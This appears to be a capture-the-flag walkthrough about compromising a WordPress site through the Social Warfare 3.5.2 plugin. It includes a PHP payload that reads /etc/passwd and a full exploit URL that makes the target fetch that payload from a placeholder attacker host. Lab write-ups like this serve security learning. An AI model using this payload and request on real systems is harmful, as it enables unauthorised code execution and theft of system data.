#### -Ran Gobuster and found "/wordpress" directory and the following wordpress site webpage. Navigated the webpage and found the below login page: 

![](../Pasted%20Images/Pasted%20image%2020220505204221.png)

![](../Pasted%20Images/Pasted%20image%2020220505204305.png)

![](../Pasted%20Images/Pasted%20image%2020220505204358.png)

#### -Ran WPScan and found the following showing plugin "social-warfare version 3.5.2": 
![](../Pasted%20Images/Pasted%20image%2020220505204529.png)

#### -Googled "social-warfare 3.5.2 exploit" and found the following ling and navigate to the web page and followed the steps: 

![](../Pasted%20Images/Pasted%20image%2020220505204612.png)

![](../Pasted%20Images/Pasted%20image%2020220505204655.png)

#### -Made a payload.txt file with the script "<pre>system('cat /etc/passwd')</pre>" inside

#### -Setup a http server to host the payload txt file with "payload.txt"

#### -Input http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt instead of listed http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt as shown in the wpscan exploit showing previously as the previous weblogin page started with "/wordpress/" directory shown below and received the following webpage finding the user "takis":  

![](../Pasted%20Images/Pasted%20image%2020220505205028.png)

![](../Pasted%20Images/Pasted%20image%2020220505205100.png)


